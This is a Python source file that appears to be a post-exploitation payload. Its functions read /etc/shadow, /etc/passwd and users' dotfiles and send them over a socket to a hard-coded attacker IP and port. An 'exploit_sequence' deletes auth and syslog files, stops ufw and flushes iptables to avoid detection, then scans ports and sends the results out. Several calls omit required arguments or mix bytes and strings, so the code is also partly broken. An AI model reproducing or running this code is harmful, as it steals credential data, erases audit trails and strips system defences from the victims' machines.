
import base64
import subprocess
import os

# Configuration
ip_connect = "10.0.2.15"   # Attacker's IP
port_connect = 1337        # Listening port


# Log output to file (attack_log.txt) on attacker
log_file = "/tmp/attack_log.txt"

def log_output(output):
    try:
        with open(log_file, "a") as f:
            f.write(output)
        print(f"[+] Log written: {output}")
        print()
    except Exception as e:
        print(f"[!] Error writing to log: {str(e)}")


# Gather system information
def gather_system_info(sock):
    try:
        # Send the command to the target
        sock.send(base64.b64encode(b"sysinfo"))
        print("[+] Sent system information request to target.")

        # Wait for the response from the target
        encoded_sysinfo = sock.recv(4096)
        if not encoded_sysinfo:
            return "[!] No response received from target."

        # Decode and log the received system information
        sysinfo = base64.b64decode(encoded_sysinfo).decode()
        log_output(f"[+] System information received: {sysinfo}")
        return sysinfo
    
    except Exception as e:
        error_message = f"[!] Error gathering system info: {str(e)}"
        log_output(error_message)
        return error_message


# Port scan (nmap)
def scan_ports():
    try:
        ports = subprocess.check_output("nmap -p 1-1000 localhost", shell=True)
        log_output("[+] Port scan completed.")
        log_output(ports.decode())  # Decode the bytes to a string (will not accept bytes)
        return ports.decode()
    
    except subprocess.CalledProcessError as e:
        error_message = f"[!] Error scanning ports: {str(e)}"
        log_output(error_message)
        return str(e)


# List files
def list_files(sock):
    try:
        files = subprocess.check_output("ls -la", shell=True).decode()
        sock.send(base64.b64encode(files.encode()))
        log_output("[+] File listing completed.")
        log_output(files)
        return files
    except subprocess.CalledProcessError as e:
        log_output(f"[!] Error listing files: {str(e)}")
        return str(e)


def download_sensitive_files(sock):
    sensitive_files = [
        "/etc/passwd", "/etc/shadow", "/etc/hostname", "/etc/hosts"
    ]

    for file_path in sensitive_files:
        # Check if file exists and is readable
        if os.path.exists(file_path):
            log_output(f"[+] File {file_path} exists.")
            if os.access(file_path, os.R_OK):
                log_output(f"[+] File {file_path} is readable.")
            else:
                error_message = f"[!] File {file_path} is not readable."
                sock.send(base64.b64encode(error_message.encode()))  
                log_output(error_message)
                continue
        else:
            error_message = f"[!] File {file_path} does not exist."
            sock.send(base64.b64encode(error_message.encode()))  
            log_output(error_message)
            continue

        try:
            with open(file_path, "rb") as f:
                file_data = base64.b64encode(f.read())  # Reads and encodes the file content
                sock.send(file_data)  # Sends the encoded file data to the attacker
                log_output(f"[+] Downloaded sensitive file: {file_path}")
        except Exception as e:
            error_message = f"[!] Error downloading {file_path}: {str(e)}"
            sock.send(base64.b64encode(error_message.encode()))  
            log_output(error_message)


def receive_and_save_file(conn, filename):
    try:
        save_path = os.path.join("/tmp", os.path.basename(filename)) # Define path
        
        # Receive the base64 encoded file data from the victim
        file_data = conn.recv(4096)
        if file_data:
            decoded_data = base64.b64decode(file_data) 
            
            # Save the file on the attacker's machine
            with open(save_path, "wb") as f:
                f.write(decoded_data)
            print(f"[+] File received and saved as: {filename}")
        else:
            print("[!] No data received.")
    except Exception as e:
        print(f"[!] Error receiving file: {str(e)}")
            

# Disable security and remove any logs
def disable_security_tools():
    logs = ["/var/log/auth.log", "/var/log/syslog", "/var/log/messages", "/var/log/secure"]
    for log in logs:
        subprocess.run(["rm", "-f", log])

    try:
        # Stop and disable firewall using systemctl
        subprocess.run(["systemctl", "stop", "ufw"], check=True)
        subprocess.run(["systemctl", "disable", "ufw"], check=True)
        subprocess.run(["iptables", "-F"], check=True)
        subprocess.run(["iptables", "-X"], check=True)
    except FileNotFoundError:
        # Fallback for older init systems
        subprocess.run(["service", "ufw", "stop"], check=True)
        subprocess.run(["service", "ufw", "disable"], check=True)
    except Exception as e:
        return f"[!] Error disabling security tools: {str(e)}"

    return "[+] Security tools disabled and logs removed."

# Attempting to escalate privileges
def attempt_privilege_escalation():
    try:
        output = subprocess.check_output("sudo whoami", shell=True)  # Will escalate if allowed
        return f"[+] Privilege escalation successful: {output.decode()}"
    except subprocess.CalledProcessError as e:
        return f"[!] Privilege escalation failed: {str(e)}"
    

# One-For-All Command to leverage attack 
def exploit_sequence(sock):
        # Step 1: Disable security tools to avoid detection
        disable_output = disable_security_tools()
        sock.send(base64.b64encode(disable_output.encode()))  # Log output to the attacker
        log_output("[+] Security tools disabled.")
        
        # Step 2: Gather system information 
        sysinfo = gather_system_info()
        sock.send(base64.b64encode(sysinfo))
        log_output("[+] System information gathered and sent.")
        log_output(sysinfo)        

        # Step 3: Perform a port scan to check for open services or ports
        ports = scan_ports()
        sock.send(base64.b64encode(ports).decode())
        log_output("[+] Port scan results sent.")
        log_output(ports)
        
        # Step 4: List files in directories
        files = list_files()
        sock.send(base64.b64encode(files))
        log_output("[+] File listing completed and sent.")
        log_output(files)
            
        # Step 5: Download files of interest
        files_to_download = ["/etc/passwd", "/home/admin/.bashrc", "/home/admin/.profile"]
        for file_path in files_to_download:
            try:
                with open(file_path, "rb") as f:
                    file_data = base64.b64encode(f.read())
                    sock.send(file_data)
                    log_output(f"[+] Sent file {file_path}.")
            except Exception as e:
                error_message = f"[!] Error downloading {file_path}: {str(e)}"
                sock.send(base64.b64encode(error_message.encode()))
                log_output(error_message)
 
